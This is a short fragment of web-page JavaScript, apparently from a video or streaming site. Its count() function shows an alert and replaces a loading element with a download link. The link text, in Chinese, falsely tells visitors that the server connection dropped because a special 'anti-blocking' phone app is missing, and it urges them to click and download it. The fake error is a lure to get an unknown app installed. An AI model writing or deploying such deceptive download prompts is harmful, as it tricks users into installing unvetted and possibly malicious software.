...
function count(){
	...
	if(bar<90){
		...
		alert(tixing);
		document.getElementById('load').innerHTML='<a href="'+appurl2+'"><span style="height:25px;line-height:25px;font-size:13px;color:#c3c3c3;">服务器连接断开：系统未检测到防屏蔽手机专用APP！高清内容，缓冲快，点击下载！</span></a>';
